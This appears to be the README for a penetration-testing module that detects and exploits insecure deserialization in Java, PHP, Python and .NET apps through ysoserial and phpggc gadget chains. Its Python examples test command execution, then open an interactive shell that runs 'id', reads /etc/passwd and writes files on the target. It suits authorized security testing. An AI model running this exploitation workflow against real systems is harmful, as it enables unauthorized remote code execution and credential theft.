# Deserialization Exploitation Module

## Overview

The deserialization module provides automated detection and exploitation of deserialization vulnerabilities in Java, PHP, Python, and .NET applications. It integrates with industry-standard tools like ysoserial and phpggc to generate and test gadget chains automatically.

## Features

### 1. Serialized Data Detection
- Automatic detection of serialized data in responses, cookies, headers, and parameters
- Format identification for:
  - Java serialization (magic bytes: 0xACED0005)
  - PHP serialization (patterns: O:, a:, s:)
  - Python pickle (protocol versions 3, 4, 5)
  - .NET binary serialization
- Base64 decoding support
- Confidence scoring for detections

### 2. Tool Integration

#### ysoserial (Java)
- Automatic integration with ysoserial JAR
- Support for all major gadget chains:
  - CommonsCollections (1-7)
  - Spring (1-2)
  - ROME
  - JDK7u21, JDK8u20
  - Groovy, Hibernate, C3P0
  - And more
- Automatic payload generation
- Command execution testing

#### phpggc (PHP)
- Integration with phpggc tool
- Support for popular PHP frameworks:
  - Laravel (RCE1-4)
  - Symfony (RCE1-4)
  - Monolog, Guzzle, Doctrine
  - Yii, CodeIgniter, CakePHP
- Base64 encoding support
- Dynamic chain discovery

### 3. Gadget Chain Testing
- Automatic testing of multiple gadget chains
- Success detection through:
  - Command output analysis
  - Error message detection
  - Response pattern matching
- Chain prioritization based on dependencies
- Detailed test results and evidence

### 4. Dependency Analysis
- Automatic extraction of dependencies from:
  - HTTP headers (Server, X-Powered-By)
  - Response bodies (error messages, stack traces)
  - Framework indicators
- Vulnerability mapping for known libraries
- Gadget chain suggestions based on detected dependencies
- Version detection and matching

### 5. Interactive Shell
- Command execution interface
- File read/write capabilities
- Directory listing
- Full shell access through deserialization
- Response capture and display

## Usage

### Basic Detection

```python
from app.modules.deserialization import DeserializationTester, SerializedDataDetector
from app.core.request_handler import RequestHandler
from app.models.target import TargetConfig

# Initialize
request_handler = RequestHandler()
tester = DeserializationTester(request_handler)

# Scan for serialized data
target = TargetConfig(url="https://example.com")
response = await request_handler.send_request("GET", target.url)
detected = await tester.scan_for_serialized_data(target, response)

for data_info in detected:
    print(f"Found {data_info.format.value} in {data_info.location}")
    print(f"Confidence: {data_info.confidence}")
```

### Testing for Vulnerabilities

```python
# Test deserialization vulnerability
for data_info in detected:
    result = await tester.test_deserialization(
        target,
        data_info,
        test_command="whoami"
    )
    
    if result.is_vulnerable:
        print(f"Vulnerable! Successful chain: {result.successful_gadget_chain.name}")
        print(f"Tool: {result.successful_gadget_chain.tool}")
        print(f"Tested {len(result.tested_chains)} chains")
```

### Dependency Analysis

```python
from app.modules.deserialization import DependencyAnalyzer

analyzer = DependencyAnalyzer()

# Extract dependencies from response
dependencies = analyzer.extract_dependencies_from_response(
    response,
    ProgrammingLanguage.JAVA
)

# Analyze for exploitable libraries
exploitable = analyzer.analyze_dependencies(
    ProgrammingLanguage.JAVA,
    dependencies
)

for lib in exploitable:
    print(f"Library: {lib['library']}")
    print(f"Suggested chains: {lib['gadget_chains']}")

# Get suggested chains
suggested = analyzer.suggest_gadget_chains(
    ProgrammingLanguage.JAVA,
    dependencies
)
print(f"Try these chains: {suggested}")
```

### Interactive Shell

```python
from app.modules.deserialization import InteractiveShell

# Create shell after successful exploitation
if result.is_vulnerable:
    shell = InteractiveShell(
        request_handler,
        target,
        data_info,
        result.successful_gadget_chain
    )
    
    # Execute commands
    cmd_result = await shell.execute_command("id")
    print(cmd_result["response_body"])
    
    # Read files
    file_result = await shell.read_file("/etc/passwd")
    print(file_result["contents"])
    
    # Write files
    write_result = await shell.write_file(
        "/tmp/test.txt",
        "Hello from deserialization!"
    )
    
    # List directories
    ls_result = await shell.list_directory("/tmp")
    print(ls_result["listing"])
```

## Configuration

### Tool Paths

The module automatically searches for tools in common locations:

**ysoserial:**
- `/usr/local/bin/ysoserial.jar`
- `/opt/ysoserial/ysoserial.jar`
- `~/tools/ysoserial.jar`
- `./ysoserial.jar`

**phpggc:**
- `/usr/local/bin/phpggc`
- `/opt/phpggc/phpggc`
- `~/tools/phpggc/phpggc`
- `./phpggc`
- System PATH

You can also specify custom paths:

```python
tester = DeserializationTester(
    request_handler,
    ysoserial_path="/custom/path/ysoserial.jar",
    phpggc_path="/custom/path/phpggc"
)
```

## Requirements

### External Tools

1. **ysoserial** (for Java deserialization)
   - Download: https://github.com/frohoff/ysoserial
   - Requires: Java Runtime Environment (JRE)

2. **phpggc** (for PHP deserialization)
   - Download: https://github.com/ambionics/phpggc
   - Requires: PHP CLI

### Python Dependencies

- aiohttp (async HTTP requests)
- Standard library modules (base64, subprocess, re, etc.)

## Detection Patterns

### Java Serialization
- Magic bytes: `AC ED 00 05`
- Hex-encoded: `aced0005`
- Base64-encoded: `rO0AB...`

### PHP Serialization
- Object: `O:8:"ClassName":...`
- Array: `a:3:{...}`
- String: `s:5:"hello";`

### Python Pickle
- Protocol 3: `\x80\x03`
- Protocol 4: `\x80\x04`
- Protocol 5: `\x80\x05`

## Gadget Chains

### Java (ysoserial)

**CommonsCollections** - Apache Commons Collections
- Versions: 3.1, 3.2, 3.2.1, 4.0
- Chains: CC1-CC7
- Most reliable for older applications

**Spring** - Spring Framework
- Versions: 4.1.4, 4.2.0
- Chains: Spring1, Spring2
- Common in enterprise applications

**ROME** - RSS/Atom library
- Version: 1.0
- Chain: ROME
- Often found in content management systems

### PHP (phpggc)

**Laravel** - Laravel Framework
- Versions: 5.4-5.8
- Chains: Laravel/RCE1-4
- Very common in modern PHP applications

**Symfony** - Symfony Framework
- Versions: 3.4, 4.0, 4.1
- Chains: Symfony/RCE1-4
- Enterprise PHP framework

**Monolog** - Logging Library
- Versions: 1.x, 2.x
- Chains: Monolog/RCE1-2
- Widely used logging library

## Security Considerations

1. **Authorization**: Only use against authorized targets
2. **Tool Availability**: Ensure ysoserial and phpggc are properly installed
3. **Command Safety**: Be careful with commands that modify system state
4. **Network Access**: Some gadget chains require outbound network access
5. **Logging**: All exploitation attempts are logged for audit purposes

## Troubleshooting

### ysoserial not found
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial.jar
sudo mv ysoserial.jar /usr/local/bin/
```

### phpggc not found
```bash
# Clone phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc
sudo ln -s $(pwd)/phpggc /usr/local/bin/phpggc
```

### Java not found
```bash
# Install Java
sudo apt-get install default-jre  # Debian/Ubuntu
sudo yum install java-11-openjdk  # RHEL/CentOS
```

### PHP not found
```bash
# Install PHP CLI
sudo apt-get install php-cli  # Debian/Ubuntu
sudo yum install php-cli       # RHEL/CentOS
```

## References

- [ysoserial](https://github.com/frohoff/ysoserial)
- [phpggc](https://github.com/ambionics/phpggc)
- [Java Deserialization Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html)
- [PHP Object Injection](https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection)
